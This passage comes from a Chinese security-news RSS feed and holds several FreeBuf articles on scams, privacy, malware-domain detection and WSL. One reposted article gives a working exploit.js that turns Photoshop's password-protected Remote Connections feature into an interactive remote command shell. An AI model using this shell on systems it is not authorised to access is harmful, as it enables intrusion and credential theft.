data-rawheight=&quot;99&quot;&gt;&lt;p&gt;以太币钱包信息&lt;/p&gt;&lt;h2&gt;&lt;b&gt;高仿诈骗不少见，受骗资金难追回&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;说起高仿，国内常见的是在新浪微博，有很多山寨的明星账号，吸引人气，博取眼球等，当然，也有高仿号模仿微博微信好友，进行诈骗，这类案例也不少见。前两天就有报道称，有网友在微博上收朋友的私信，谎称转账出现问题，让其帮忙垫付机票钱。由于这名网友警惕性高，最终识破骗局。这个案例中，骗子就使用了高仿号，与好友的昵称很像。&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-16cb02960a2590562776d85d49e005d2_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;440&quot; data-rawheight=&quot;874&quot;&gt;&lt;p&gt;骗子使用的高仿号，在好友的昵称后多加了一个“-”&lt;/p&gt;&lt;p&gt;去年也曾有媒体报道称，仅在一个受害者群里，百余名受害者已被骗取 170 多万元，且警方曾表示，这类骗局，追回受骗资金的概率较小。&lt;/p&gt;&lt;p&gt;&lt;b&gt;FreeBuf 在此提醒大家，社工防不胜防，网络安全常记心间哦。&lt;/b&gt;&lt;/p&gt;&lt;b&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-dd5109e391cb64da66ddfc3dac6f2007_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;346&quot; data-rawheight=&quot;318&quot;&gt;&lt;/b&gt;&lt;p&gt;&lt;b&gt;*参考来源：&lt;u&gt;&lt;a href=&quot;https://twitter.com/elonmusk&quot;&gt;Twitter&lt;/a&gt;&lt;/u&gt;，&lt;u&gt;&lt;a href=&quot;http://news.sina.com.cn/o/2018-02-05/doc-ifyreuzn3300032.shtml&quot;&gt;新浪新闻&lt;/a&gt;&lt;/u&gt;，AngelaY 整理，转载请注明来自 FreeBuf.COM&lt;/b&gt;&lt;/p&gt;</description>
<author>鲍弘捷</author>
<guid isPermaLink="false">2018-02-08-33687564</guid>
<pubDate>Thu, 08 Feb 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>从刷支付宝乘地铁谈起，浅议大数据时代的隐私安全</title>
<link>https://henix.github.io/feeds/zhuanlan.freebuf/2018-01-22-33184183.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/33184183&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-27b0283dbc3976f250c3c7cc38d5289b_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;blockquote&gt;据悉，在2018年，每个月都会有新的城市在公交地铁领域开通移动支付。&lt;/blockquote&gt;&lt;p&gt;&lt;b&gt;近期支付宝、微信、银联等移动支付企业纷纷抢滩城市公共服务。针对地铁公交这一场景，目前已经有超过30个城市在支付宝内上线了电子公交卡功能，这意味着——用户可以丢开匿名的交通卡，使用支付宝及相关应用进行刷码通行。&lt;/b&gt;&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-27b0283dbc3976f250c3c7cc38d5289b_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;518&quot;&gt;&lt;p&gt;和此前共享单车市场相比，轨道交通等公共出行在每个人的生活中都占据了更重要的地位。用“&lt;b&gt;现代支付系统”取代“传统地铁充值卡”所能提供的便利，让很多用户感到迫不及待。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;而在现代支付系统的接入之后，出行的数据也可能继续用在城市交通管理之中，改善更多其他服务，如改进城市的交通服务、整治拥堵等等。而这些便利存在的前提在于——当今的大数据时代大背景。&lt;/p&gt;&lt;p&gt;高速发展、高吞吐量的大数据时代，绝大多数人都的所有行为逐渐都能在信息世界之中留下数据足迹，无论是用户主动留下的数字脚印，还是由他人建立的关于用户的数据。&lt;/p&gt;&lt;p&gt;&lt;b&gt;在此，笔者仍然希望“老生常谈地”与大家探讨大数据时代的个人隐私问题。&lt;/b&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;个人与服务商之间的信息不对称&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;信息时代下，只要我们使用在线工具和平台，或者接入平台的服务，就会产生相应的数据。在一些观点看来，人人是数据的生产者，可以让信息变得更透明。但是作为线上服务的使用者，即便有用户隐私条款的存在，多数的用户仍然并不了解自己被采集了什么样的信息，被追踪了哪些数据。&lt;/p&gt;&lt;p&gt;条款中冗长的文字、专业的术语，都会给普通用户的精准理解带来一点困难。除此之外，用户条款中夹杂的&lt;b&gt;“可能”、“潜在”&lt;/b&gt;等词汇的存在，继续模糊了好不容易建立起来的一点概念。这些数据的使用状况，数据分析和挖掘的目标和最终的数据消费者，更是不得而知。&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-2c190926000b816af89f32682edce2d0_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;502&quot;&gt;&lt;p&gt;即便一些用户是较为谨慎的——他们在选择应用服务的时候会考虑“数据泄漏”带来的影响，但他们能够避开的更多只是一些声誉差的，已经发生过数据泄漏的企业。通常情况下，规模较大的企业能够享有更好的声誉和用户口碑，获得多数人的信任和青睐。&lt;/p&gt;&lt;p&gt;如果这家服务商的大名家喻户晓，人人都在使用它的APP，更多的用户就能放心大胆的进行注册，然后开始使用这款服务。但显然，这仍然只是“一厢情愿”的信任，大的企业也可能存在安全漏洞和疏忽。仅在过去的一年中，就继续曝出了大大小小的数据泄漏事件，其中也有不少知名大企业的身影。&lt;/p&gt;&lt;blockquote&gt;互联网巨头 Yahoo 数据泄漏：10亿账号的用户姓名、生日、邮箱地址、密码、电话、安全问题和答案全被泄露&lt;br&gt;美国三大信贷之一 Equifax 数据泄漏：超过 1.43 亿的美国用户数据泄漏，包括姓名，社保号码，出生日期，地址，及驾驶证信息；20.9 万用户的信用卡号，以及部分英国和加拿大用户信息。&lt;br&gt;移动出行 Uber 数据泄漏：5700 万乘客用户信息泄漏，5万名司机信息泄露。&lt;/blockquote&gt;&lt;h2&gt;&lt;b&gt;深度分析和机器学习在混淆隐私边界吗&lt;/b&gt;&lt;/h2&gt;&lt;blockquote&gt;积累足够全面的数据才能让有规律的随机事件，在大量重复出现的条件下，呈现出几乎必然的统计特性。&lt;/blockquote&gt;&lt;p&gt;随着政府的政策支持和公共部门积极进行数据整合，冗余数据中蕴含的战略和资产方面的价值逐渐浮出水面，企业纷纷着力于进行大数据技术研发与产品化。企业在应用数据进行决策和谋利的同时，仍然会不言而喻地使用用户的个人数据，使之在整合、关联和深度分析时受到隐私侵犯。 在当前数据科学和信息技术发展的过程中，隐私信息的界定正在变得不严格。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-ee193d0f648f4e1990eef9f0fe82ab04_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;582&quot; data-rawheight=&quot;368&quot;&gt;&lt;p&gt;巨大的数据集之下，即便个人提供部分数据字段，也可能被得出一些隐秘的推测，并给用户带来风险。&lt;/p&gt;&lt;p&gt;2016年，上海交通大学的一篇机器学习论文《基于面部图像的自动犯罪概率推断》曾引起过争议。相同遭遇的还有2017年斯坦福大学公布的论文&lt;/p&gt;&lt;a href=&quot;https://osf.io/zn79k/&quot; data-draft-node=&quot;block&quot; data-draft-type=&quot;link-card&quot; data-image=&quot;v2-9c10c7af6aac3526539772ff269af9d6&quot; data-image-width=&quot;165&quot; data-image-height=&quot;165&quot; data-image-size=&quot;ipico&quot;&gt;&lt;br&gt;        Deep neural networks are more accurate than humans at detecting sexual orientation from facial images.&lt;br&gt;&lt;/a&gt;&lt;p&gt;，其中的 AI 算法已经能够通过个人的肖像照片识别同性恋，且准确率高达81%。&lt;/p&gt;&lt;p&gt;公开在社交网站及其他角落的相片信息中的肖像不存在隐私问题，但对于人脸图像数据的分析、存储和使用，隐私权问题依旧面临挑战。如果个人用户并不在意自己在各个角落的信息披露，认为网络空间仅仅是和普通公共场所一样，那么当处在隐私边界时，他们就容易遭到认知偏差的影响，比如过度低估个人信息的利用程度和数据价值。&lt;b&gt;只需要一些公开的信息，运用技术就可以对个人的情况进行推断、分类甚至“定价”和“特殊对待”。&lt;/b&gt;&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-902ea81f4cbd7a9625f119a12b6c158c_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;633&quot; data-rawheight=&quot;480&quot;&gt;&lt;p&gt;如今企业在技术层面的数据挖掘技术的演进、机器学习和深度学习算法的发展，都让数据利用效率和程度得到显著提升。特定的分析流程和算法有时很难进行描述和解释，服务运营商甚至在进行分析之前也不了解他们能够得到的结果。更多隐私问题甚至是在二次开发利用原始数据时才引发的，因此在法律监管上也存在难度。&lt;/p&gt;&lt;p&gt;隐私专家 John Diebold 曾前写过这样一句话，而这在不久之后的将来，这可能会成为现实。&lt;/p&gt;&lt;blockquote&gt;信息时代你留下的每一个字节，都会是构成隐私的血肉。&lt;/blockquote&gt;&lt;h2&gt;&lt;b&gt;隐私意识在觉醒，但是…&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;2018年伊始时，大家的朋友圈都曾一度遭遇被“支付宝年度账单”和“网易云音乐”统治的时刻，随后当天就有用户揭露被安插在年度账单首页之中、必须签署的《用户隐私协议》。&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-0a100a715099b633dfb3a3a7fff1b600_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;600&quot; data-rawheight=&quot;439&quot;&gt;&lt;p&gt;细心用户发现了这行隐蔽的小字，并点开看了《用户协议》，但也许是因为个人意志还无法抗衡从众心理，又或许还是败给了自己的好奇心，最终绝大多数用户还是同意将自己的数据授权给了芝麻服务，开开心心地在朋友圈晒了支付宝年度截图。&lt;/p&gt;&lt;p&gt;可以发现人们的隐私意识虽然存在，但依然愿意用牺牲个人数据换取更好的网络生活，或者将安全和隐私的责任完全寄托在政府和网络服务商身上。2014年时，EMC在15个国家和地区进行了15000 用户的隐私保护调查，而调查结果依旧让人担忧。&lt;/p&gt;&lt;blockquote&gt;50%的用户遭遇过或大或小的数据泄漏&lt;br&gt;62%的用户并不会定期修改密码&lt;br&gt;33%的人不会修改社交网络上的隐私设置&lt;br&gt;39%的人不会对自己的移动设备设置密码&lt;/blockquote&gt;&lt;p&gt;而 2018 年 刚刚召开的Usenix Enigma 安全峰会上，谷歌工程师也在演讲时道出了谷歌用户的安全意识现状，可以看到情况并不乐观——尽管早在 7 年前谷歌就开始引入了两步验证（2FA）功能，但目前有效的谷歌账户中，少于 10% 的用户开启了两步验证功能对账户进行保护；而使用密码管理器的用户在整体仅占12%的比例。&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-81950219af9d11ee2db3546e54d6563b_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;648&quot; data-rawheight=&quot;399&quot;&gt;&lt;h2&gt;&lt;b&gt;安全、便利和隐私之争始终无法停歇&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;大数据时代的便利已经渗透进了我们生活的每个角落，更低的商品价格、更符合实时需求的产品和社会沟通度，要使用这些服务就会创建个人数据，而通过数据信息就总有办法辨析出个人的身份。&lt;/p&gt;&lt;p&gt;如果用户确实关心自己的隐私状况，不希望泄漏信息还是有一些简单的措施可以采纳：&lt;/p&gt;&lt;blockquote&gt;1. 避免连接公共WiFi，及时在所有设备上进行安全更新&lt;br&gt;2. 开启账户两步验证功能，安装密码管理器&lt;br&gt;3. 注意所有应用程序的权限设置&lt;br&gt;4. 斟酌填写真实信息，适当选择备用方式&lt;br&gt;5. 开启浏览器拒绝跟踪功能，及时清理 cookie&lt;br&gt;6. 适当使用匿名互联网服务&lt;/blockquote&gt;&lt;hr&gt;&lt;h2&gt;&lt;b&gt;FreeBuf 隐私安全文章推荐阅读&lt;/b&gt;&lt;/h2&gt;&lt;a href=&quot;http://www.freebuf.com/articles/database/142797.html&quot; data-draft-node=&quot;block&quot; data-draft-type=&quot;link-card&quot; data-image=&quot;v2-722b44268b083aca7e9724033d955a73&quot; data-image-width=&quot;600&quot; data-image-height=&quot;247&quot; data-image-size=&quot;180x120&quot;&gt;科技之殇：端到端加密究竟保护了谁？&lt;/a&gt;&lt;a href=&quot;http://www.freebuf.com/news/160692.html&quot; data-draft-node=&quot;block&quot; data-draft-type=&quot;link-card&quot; data-image=&quot;v2-a439800f9a5ef19529a3f9037572782c&quot; data-image-width=&quot;690&quot; data-image-height=&quot;388&quot; data-image-size=&quot;180x120&quot;&gt;研究人员称HTML5可以被用来追踪网民 - FreeBuf.COM | 关注黑客与极客&lt;/a&gt;&lt;a href=&quot;http://www.freebuf.com/articles/terminal/152424.html&quot; data-draft-node=&quot;block&quot; data-draft-type=&quot;link-card&quot; data-image=&quot;v2-b9b5c5054751576a5900efa55a12352e&quot; data-image-width=&quot;690&quot; data-image-height=&quot;360&quot; data-image-size=&quot;180x120&quot;&gt;得到相机授权的iPhone APP可在你不知情的情况下偷偷拍照窃取隐私&lt;/a&gt;&lt;a href=&quot;http://www.freebuf.com/articles/web/152691.html&quot; data-draft-node=&quot;block&quot; data-draft-type=&quot;link-card&quot; data-image=&quot;v2-08fc8bc192ba49ffad25b8d033dd3a63&quot; data-image-width=&quot;690&quot; data-image-height=&quot;360&quot; data-image-size=&quot;180x120&quot;&gt;Firefox再次从Tor浏览器中借鉴了一个隐私保护功能 - FreeBuf.COM | 关注黑客与极客&lt;/a&gt;&lt;a href=&quot;http://www.freebuf.com/news/149646.html&quot; data-draft-node=&quot;block&quot; data-draft-type=&quot;link-card&quot; data-image=&quot;v2-8bca6f8bfeba16c47b073a2e0ffd6b2f&quot; data-image-width=&quot;690&quot; data-image-height=&quot;400&quot; data-image-size=&quot;180x120&quot;&gt;Signal 新探索：运用英特尔 SGX 加强联系人搜索功能的隐私安全&lt;/a&gt;&lt;a href=&quot;http://www.freebuf.com/news/155139.html&quot; data-draft-node=&quot;block&quot; data-draft-type=&quot;link-card&quot; data-image=&quot;v2-b88f1203b4680ac03ecc12fbb60a4a30&quot; data-image-width=&quot;690&quot; data-image-height=&quot;388&quot; data-image-size=&quot;180x120&quot;&gt;Google无视用户隐私设置，暗中收集Android位置数据 - FreeBuf.COM | 关注黑客与极客&lt;/a&gt;&lt;a href=&quot;http://www.freebuf.com/news/148292.html&quot; data-draft-node=&quot;block&quot; data-draft-type=&quot;link-card&quot; data-image=&quot;v2-14f0f5da2d17c9f79587ece2c21ed8ef&quot; data-image-width=&quot;690&quot; data-image-height=&quot;251&quot; data-image-size=&quot;180x120&quot;&gt;你的终端是安全的吗？iTerm2 中可能通过 DNS 请求泄漏隐私信息&lt;/a&gt;&lt;p&gt;&lt;b&gt;*本文作者Elaine，转载请注明FreeBuf.COM&lt;/b&gt;&lt;/p&gt;</description>
<author>鲍弘捷</author>
<guid isPermaLink="false">2018-01-22-33184183</guid>
<pubDate>Mon, 22 Jan 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>自动化沙箱打造之“关于XShell我有话说”</title>
<link>https://henix.github.io/feeds/zhuanlan.freebuf/2017-08-18-28609222.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/28609222&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;b&gt;最近XShell很是火了一把，每个安全厂商都在发通告，都在分析，反正就是百花齐放，在这里我想做一个总结，从前些时间的勒索软件到今天的xshell，其实我们可以看到共同点：&lt;/b&gt;&lt;/p&gt;&lt;blockquote&gt;那就是根据特定的算法生成伪随机的域名，当然这些域名都是未注册的，这样就有一个好处就是不容易暴露，让人找不到源头，并且由于域名无法解析导致后面的流程无法执行，等到感染量大后，再注册域名，这样就可以在几天之内做很惊人的事情。&lt;/blockquote&gt;&lt;p&gt;那么对于这种情况怎么防止呢？先看看自动化沙箱的其中一个功能吧，沙箱不太完善，最近在修改中，先看看结果吧。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-d8a1f0b414c1643e38db232e3473bf79_r.jpg&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;317&quot;&gt;&lt;p&gt;看isReg栏目，当 reg=1的时候 说明域名已经被注册，当reg=0的时候 说明域名没有被注册 ，如果reg=0，那么就要注意了，我们又遇到那种先随机生成域名，让病毒感染一段时间在操作的事情了。&lt;/p&gt;&lt;h2&gt;详细实现步骤&lt;/h2&gt;&lt;p&gt;第一步：沙箱客户端的功能之一 基于wpcap开发了一个抓dns包的工具&lt;/p&gt;&lt;p&gt;打开这个工具&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-5515eaf0d38ff7380df1b2bdec93c410_r.jpg&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;342&quot;&gt;&lt;p&gt;第二步：运行特定软件&lt;/p&gt;&lt;p&gt;我这里选择xshell，蹭蹭热度&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;//2017.8%E6%9C%88%E4%BB%BD%E7%9A%84&quot;&gt;//2017.8月份的&lt;/a&gt;&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-b69aae926ea9327a2e0cb9fe302ecc24_r.jpg&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;463&quot;&gt;&lt;p&gt;现在我修改一下时间2016.12&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-4fe603f2190b527387b1824f2df27924_r.jpg&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;275&quot;&gt;&lt;p&gt;第三步：工具会给域名提交到沙箱网站上，看数据库设计&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-54c372ae11b00bb09ee15babcbc91435_r.jpg&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;325&quot;&gt;&lt;p&gt;第四步：当查看沙箱网站首页的时候，调用域名查询接口，这里我是调用阿里云的dns查询接口&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-3bbe7da2e86ddd73a57e989aa23f9328_r.jpg&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;261&quot;&gt;&lt;p&gt;有人会说我用wireshark抓包，再到注册域名的网站查询一下，可以，但是你会很浪费时间，并且效率不高，现在都是自动化了。&lt;/p&gt;&lt;h2&gt;总结一下&lt;/h2&gt;&lt;p&gt;现在木马慢慢开始倾向于域名先生成，再注册的形式，那么我们手上的工具能否与时俱进啦？&lt;/p&gt;&lt;p&gt;ps：对这个项目感兴趣我们私下交流，需要源码，发私信给我，我这里就不过多的讲解源代码了，思路为上。&lt;/p&gt;&lt;p&gt;*本文作者：刀郎，&lt;a href=&quot;http://%E8%BD%AC%E8%BD%BD%E8%AF%B7%E6%B3%A8%E6%98%8E%E6%9D%A5%E8%87%AAFreeBuf.COM&quot;&gt;转载请注明来自FreeBuf.COM&lt;/a&gt;&lt;/p&gt;</description>
<author>鲍弘捷</author>
<guid isPermaLink="false">2017-08-18-28609222</guid>
<pubDate>Fri, 18 Aug 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>如何把Photoshop改造成远程控制工具（RAT）来利用</title>
<link>https://henix.github.io/feeds/zhuanlan.freebuf/2017-08-09-28419023.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/28419023&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;作者在本文中通过对Photoshop远程连接功能的改造利用，最终实现了对开启远程连接功能的Photoshop端操作系统的接管控制。&lt;/p&gt;&lt;h2&gt;Photoshop远程连接功能说明&lt;/h2&gt;&lt;p&gt;Photoshop中有一个名为远程连接（Remote Connections）的可选功能，该功能默认是关闭的，但如果你启用该功能并设置密码后，任何知晓密码的人就可以远程接入到你电脑的Photoshop服务端。如下开启画面：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-bc3e858ce3019ff3db9920677268c0d9_r.jpg&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;353&quot;&gt;&lt;p&gt;正常用户利用该功能，来实时预览不同PS文件在iPad或手机等远程设备上的实际设计外观样式，该远程预览功能需要手机等移动终端安装如PS Playon和Skala Preview等第三方APP来实现连接。如Skala Preview：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-b5771364f19736931d29e426bf2c4f1b_r.jpg&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;361&quot;&gt;&lt;p&gt;该远程连接功能基于Photoshop的JSX脚本实例。JSX属Photoshop的宏脚本，由Javascript语言编写，以实现Photoshop的图片加载、颜色渲染、矢量绘制和导出等功能，可&lt;a href=&quot;http://wwwimages.adobe.com/content/dam/Adobe/en/devnet/photoshop/pdfs/photoshop-cc-scripting-guide-2015.pdf&quot;&gt;点此查看&lt;/a&gt;JSX的相关编写规范和可用接口。&lt;/p&gt;&lt;p&gt;另外，Adobe提供了一个开源库内核生成器来建立该远程连接，所以如果您对其中的协议细节有兴趣，也可&lt;a href=&quot;https://github.com/adobe-photoshop/generator-core/blob/master/lib/ps_crypto.js#L51&quot;&gt;点此查看&lt;/a&gt;。当开启远程连接后，Photoshop将会对49494端口进行监听：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;$ netstat -an | grep 49494
tcp4 0 0 *.49494 *.* LISTEN&lt;/code&gt;&lt;p&gt;以下代码为与远程Photoshop服务端用来进行身份验证交互的代码：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;const core = require(&quot;generator-core/lib/generator&quot;)
const options = {
    host: &#39;192.168.1.123&#39;,
    password: &#39;password&#39;,
    port: 49494
}
const generator = core.createGenerator()
generator.start(options).done(() =&amp;gt; {
    generator.evaluateJSXString(&#39;alert(&quot;Hello&quot;)&#39;).then(() =&amp;gt; generator.shutdown())
})&lt;/code&gt;&lt;p&gt;对此，我曾尝试利用以下app.system方法来调用系统命令：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;alert(app.system(“id”))&lt;/code&gt;&lt;p&gt;但遗憾的是其返回值却是一些退出状态码，不是标准的命令输出内容。经过研究，我发现Photoshop的JSX脚本具备系统访问接口，所以，这样一来，我们可以把其标准输出内容（stdout）重定向到一个临时文件中，之后，就可以对该文件进行读取。如下所示：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;var tmpFile = Folder.temp + &#39;output.txt&#39;;
app.system(&quot;id &amp;gt; &quot; + tmpFile);
var stdout = new File(${tmpFile});
stdout.open(&#39;r&#39;);
stdout.encoding = &quot;UTF-8&quot;;
var content = stdout.read();
stdout.close();
stdout.remove();
alert(content);&lt;/code&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-d14d18dd97cc301c214f531b82dbcea0_r.jpg&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;531&quot;&gt;&lt;h2&gt;Photoshop RAT 改造成型&lt;/h2&gt;&lt;p&gt;因此，我可以在上述身份验证代码中作出如下修改，通过用户名密码方式登录远程Photoshop服务端，之后，再利用JSX脚本接口间接执行Photoshop服务端系统命令，实现对远程Photoshop服务端系统的直接接管控制。以下为exploit代码：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;exploit.js:
const readline = require(&#39;readline&#39;)
const backdoor = require(&quot;generator-core/lib/generator&quot;)
const options = {
  host: &#39;192.168.0.101&#39;,
  password: &#39;password&#39;,
  port: 49494,
}
console.info(&#39;Establishing connection to &#39; + options.host)
const generator = backdoor.createGenerator()
generator.start(options).done(() =&amp;gt; {
  const rl = readline.createInterface({input: process.stdin, output: process.stdout, prompt: &#39;&amp;gt; &#39;})
    .on(&#39;line&#39;, line =&amp;gt; {
      let command = line.trim()
      let tmpFile = `Folder.temp + ${JSON.stringify(Math.random() + &#39;.txt&#39;)}`
      let jsx = `
        app.system(&quot;${command} &amp;gt; &quot; + ${tmpFile});
        var stdout = new File(${tmpFile});
stdout.open(&#39;r&#39;);
        stdout.encoding = &quot;UTF-8&quot;;
        var content = stdout.read();
        stdout.close();
        stdout.remove();
        content
        `
      generator.evaluateJSXString(jsx).then(output =&amp;gt; {
        console.log(output)
        rl.prompt()
      })
    })
    .on(&#39;SIGINT&#39;, () =&amp;gt; {
      console.log(&#39;bye&#39;)
      generator.shutdown()
      rl.close()
    })
  console.log(&#39;Remote photoshop shell&#39;)
  rl.prompt()
})&lt;/code&gt;&lt;p&gt;成功利用后，读取远程Photoshop服务端操作系统密码：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-af6eedaf4ed1f9e3477f134eac624533_r.jpg&quot; data-rawwidth=&quot;552&quot; data-rawheight=&quot;311&quot;&gt;&lt;h2&gt;影响分析&lt;/h2&gt;&lt;p&gt;在内网中，你可以通过49494端口扫描或组播DNS”_photoshopserver.tcp”抓包来探测一些开启远程连接功能的Photoshop服务端，之后利用以上exploit.js进行把玩。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-7cd77c2e3313ac86c639b83ea95b0354_r.jpg&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;302&quot;&gt;&lt;p&gt;该功能的此种RAT方式利用，&lt;b&gt;前提必须知晓对方Photoshop服务远程连接密码，因此并不属于漏洞范畴。基于此，请谨慎开启你的Photoshop远程连接功能，或严格保存你的Photoshop远程连接密码，否则，你的操作系统有可能被不怀好意之人远程控制。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;*参考来源：&lt;a href=&quot;https://medium.com/0xcc/how-to-turn-photoshop-into-a-remote-access-tool-805485a9480&quot;&gt;medium&lt;/a&gt;，作者：Clouds，转载请注明来自&lt;a href=&quot;http://www.freebuf.com&quot;&gt;FreeBuf.COM&lt;/a&gt;   &lt;/p&gt;</description>
<author>鲍弘捷</author>
<guid isPermaLink="false">2017-08-09-28419023</guid>
<pubDate>Wed, 09 Aug 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>浅谈Windows 10中藏着的那个Linux</title>
<link>https://henix.github.io/feeds/zhuanlan.freebuf/2017-06-21-27497774.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/27497774&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;早在去年8月份，eWEEK曾经发表过一篇文章，题为《藏于Windows 10之中Linux内核风险》。我觉得这个话题还是挺有意思的，这里将这篇文章与列位分享。&lt;/blockquote&gt;&lt;p&gt;早在去年8月份，eWEEK曾经发表过一篇文章，题为《藏于Windows 10之中Linux内核风险》。这篇文章实际上是对Crowdstrike首席架构师Alex Ionescu在去年Black Hat USA安全大会上发言的简单总结。我觉得这个话题还是挺有意思的，我在去年Black Hat USA的&lt;a href=&quot;http://www.freebuf.com/news/111125.html&quot; data-editable=&quot;true&quot; data-title=&quot;总结文章&quot;&gt;总结文章&lt;/a&gt;中也提到了这个议题，不过可惜未能亲临现场听教，这里将这篇文章添油加醋后与列位分享，仅停留在理论和嘴炮上，但可作为各位深入研究的切入点。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-70960a6db44ac5ebbba031af9de20727_r.jpg&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;460&quot;&gt;&lt;h2&gt;Windows 10中的Linux&lt;/h2&gt;&lt;p&gt;微软去年3月份在Build大会上宣布“将Ubuntu Linux的一些能力带给微软用户”。其实最初Windows 10系统中引入Bash就已经让不少人感觉到惊讶了（Bash on Ubuntu on Windows），不过Bash对很多人来讲也是福音，比如能运行GUI Linux应用了。但实际情况还不止于此，微软去年其实已经向大众明确解释了Windows 10中的Linux子系统。&lt;/p&gt;&lt;p&gt;这里多嘴一句，似乎在纳德拉成为微软CEO之后，其行事风格已经发生了极大转变，拥抱Linux不过是其中一个事件罢了——且拥抱Linux这件事并不只是通过在Windows中塞个Linux实现的，似乎前两年微软在培训体系中已经增加了更多针对Linux工程师的联合认证，而且是和Linux基金会合作的。&lt;/p&gt;&lt;p&gt;微软首席软件架构负责人Deepu Thomas说，其中Linux子系统就是微软Windows Kernel团队打造的，而且绝不只是加个解释层或虚拟机。据说这个Windows Subsystem for Linux几年前就已经诞生了，针对的是NT内核，彼时是期望以此支持POSIX和OS/2。&lt;/p&gt;&lt;p&gt;Thomas说这是用户模式（或者叫用户态，user mode）Linux二进制代码和Windows内核组件之间，”the magic happens”。微软令Linux系统调用能够直接往Windows内核，Pico进程（有关Pico详情可见&lt;a href=&quot;https://blogs.msdn.microsoft.com/wsl/2016/05/23/pico-process-overview/&quot; class=&quot;&quot; data-editable=&quot;true&quot; data-title=&quot;Pico Process Overview&quot;&gt;Pico Process Overview&lt;/a&gt;）中放了未修改版（原话就是未修改版）的Linux二进制程序。他稍稍解释了Windows Subsystem for Linux（简称WSL）的组成：&lt;/p&gt;&lt;p&gt;WSL由一系列组件组成，可让原生的Linux ELF64二进制程序在Windows之上运行。它包含用户态和内核态组件。主要组成部分包括：&lt;/p&gt;&lt;blockquote&gt;- 用户模式管理服务，用于处理Linux实例生命周期；&lt;br&gt;- Pico Provider驱动（lxss.sys, lxcore.sys），通过解释Linux系统调用来模拟Linux内核；&lt;br&gt;- Pico进程，放置原版用户模式Linux（e.g. /bin/bash）&lt;/blockquote&gt;&lt;p&gt;当然了，要将这么个子系统塞进Windows中，并非一个简单的进程就能搞定的。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-8c349e1f868c61c8bbf9ae960b2e3824_r.jpg&quot; data-rawwidth=&quot;690&quot; 